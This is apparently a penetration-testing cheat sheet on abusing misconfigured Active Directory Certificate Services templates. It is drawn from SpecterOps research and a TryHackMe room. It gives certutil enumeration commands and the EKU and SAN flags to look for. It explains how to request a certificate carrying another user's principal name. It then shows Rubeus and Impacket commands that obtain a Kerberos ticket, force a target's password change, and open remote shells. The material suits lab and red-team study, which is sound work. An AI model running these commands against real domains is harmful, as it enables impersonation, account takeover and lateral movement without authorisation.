# AD Certificate Templates

AD CS is Microsoft's Public Key Infrastructure (PKI) implementation.

| Acronym | Description                                                                                            |
| ------- | ------------------------------------------------------------------------------------------------------ |
| AD CS   | Active Directory Certificate Services                                                                  |
| PKI     | Public Key Infrastructure                                                                              |
| CA      | Certificate Authority is a PKI that issues certificates                                                |
| CSR     | Certificate Signing Request                                                                            |
| EKU     | Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be used |

## Certificate template enumeration

Enumerate all templates:

```bash
certutil -v -template
certutil -template
```

Target parameter:

1. A template where we have the relevant permissions to request the certificate or where we have an account with those permissions
2. A template that allows client authentication, meaning we can use it for Kerberos authentication
3. A template that allows us to alter the subject alternative name (SAN)

### 1. Relevant Permissions

Permission:

- `Allow Enroll`
- `Allow Full Control`

Group:

- `Domain Users`
- `Domain Computers`
- Search based on: `net user USERNAME /domain`

### 2. Client Authentication

We need to review the EKU properties of the template and ensure that the words Client Authentication is provided

Greppable property:

- `1.3.6.1.5.2.3.4 Client Authentication`
- `1.3.6.1.5.5.7.3.2 Client Authentication`
- `1.3.6.1.4.1.311.20.2.2 Client Authentication`
- `2.5.29.37.0 Client Authentication`

### 3. Client Specifies SAN

We need to review the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT property flag that should be set to 1.

Grep property: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1`

## Generating a malicious certificate

```text
mmc  
    -> File -> Add/Remove Snap-in 
        -> Certificates
```

### Request Certificates

Subject:

```text
Common name: NAME
User principal name: USER@DOMAIN_NAME
```

Export certificate with `private key` in `pfx` format.

## User impersonation through a certificate

### Use the certificate to request a Kerberos ticket granting ticket (TGT)

Using Rubeus:

```batch
Rubeus.exe asktgt /user:USERNAME /enctype:aes256 /certificate:CERT_PATH /password:CERT_PASSWORD /outfile:TGT_PATH.kirbi /domain:DOMAIN_NAME /dc:IP_ADDRESS_DC
```

### Pass The Ticket Attack - Load the Kerberos TGT into your hacking platform of choice

> Rubeus (Change user password)

```batch
Rubeus.exe changepw /ticket:TGT_PATH.kirbi /new:NEW_PASSWORD /dc:DC_NAME.DOMAIN_NAME /targetuser:DOMAIN_NAME\AD_USERNAME
runas /user:DOMAIN_NAME\AD_USERNAME cmd
```

> psexec/smbexec/wmiexec

```batch
export KRB5CCNAME=ticket.ccache
psexec DOMAIN_NAME\AD_USERNAME -k -no-pass
smbexec DOMAIN_NAME\AD_USERNAME -k -no-pass
wmiexec DOMAIN_NAME\AD_USERNAME -k -no-pass
```

#### Convert kirbi to ccache file

Tool: <https://github.com/Zer1t0/ticket_converter>

Converting ccache => kirbi:

```bach
python ticket_converter.py ticket.ccache ticket.kirbi
```

Converting kirbi => ccache:

```bach
python ticket_converter.py ticket.kirbi ticket.ccache
```

## Source

- <https://posts.specterops.io/certified-pre-owned-d95910965cd2>
- <https://tryhackme.com/room/adcertificatetemplates>
- <https://github.com/GhostPack/PSPKIAudit>
